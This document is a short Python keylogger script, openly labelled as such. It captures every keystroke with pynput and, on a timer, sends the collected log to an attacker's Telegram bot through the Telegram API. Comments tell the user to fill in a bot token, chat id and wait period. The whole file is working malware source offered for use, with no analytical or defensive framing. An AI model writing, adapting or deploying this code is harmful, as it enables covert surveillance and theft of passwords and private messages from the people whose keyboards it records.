#!/usr/bin/env python3

import pynput.keyboard
import threading
import requests


log=""

def append_to_log(string):
    global log
    log=log+string

def send(msg):
    print("[+] sending report..")
    
    #uncomment next two lines and add ur telegram bot token and chat id..
    #token= "TELEGRAM TOKEN"
    #chat_id="TELEGRAM CHAT ID"
    
    url=f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text={msg}"
    json_data=requests.get(url).json()
    if json_data['ok'] == True:
        print("[+] Message Sent Successfully!")
    elif json_data['ok'] == False:
        print("[x] Message Not Sent(e.g empty message)..")

def report():
    global log
    send(log)
    log=""
    
    #uncomment and put ur desired wait time before sending keylogs..
    #period=5
    
    timer=threading.Timer(period,report)
    timer.start()

def process_key_press(key):
    global log
    try:
        log=log+str(key.char)
    except AttributeError:
        if key == key.space:
            log=log+" "
        else:
            log=log+" "+str(key)+" "


def start():
    keyboard_listener=pynput.keyboard.Listener(on_press=process_key_press)
    with keyboard_listener:
        report()
        keyboard_listener.join()



print("[+] STARTING KEYLOGGER...\n\n")
start()
